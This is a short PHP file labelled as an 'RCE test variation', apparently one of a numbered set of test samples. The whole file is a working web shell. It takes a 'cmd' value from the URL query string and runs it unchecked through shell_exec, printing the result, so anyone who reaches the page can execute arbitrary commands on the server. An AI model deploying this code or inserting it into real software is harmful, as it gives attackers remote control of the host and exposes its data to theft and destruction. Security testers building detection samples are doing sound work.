<?php
// RCE test variation #149
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>